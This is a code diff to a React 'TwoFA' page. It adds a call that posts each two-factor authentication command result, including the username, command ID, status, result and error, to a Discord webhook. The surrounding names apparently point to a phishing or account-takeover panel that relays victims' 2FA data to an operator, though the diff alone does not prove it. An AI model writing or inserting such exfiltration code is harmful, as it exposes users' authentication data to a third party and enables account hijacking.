@@ -13,6 +13,7 @@ import type {
 import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const TwoFA = () => {
   const location = useLocation();
@@ -124,6 +125,32 @@ export const TwoFA = () => {
         setToast("Timeout, please try again");
         return;
       }
+
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for 2FA command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "2FA Command Result",
+        content:
+          "🔑 **2FA Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
 
       if (finalState.status === "done" && finalState.result?.ok) {
         console.log("✅ 2FA OK", finalState.result);
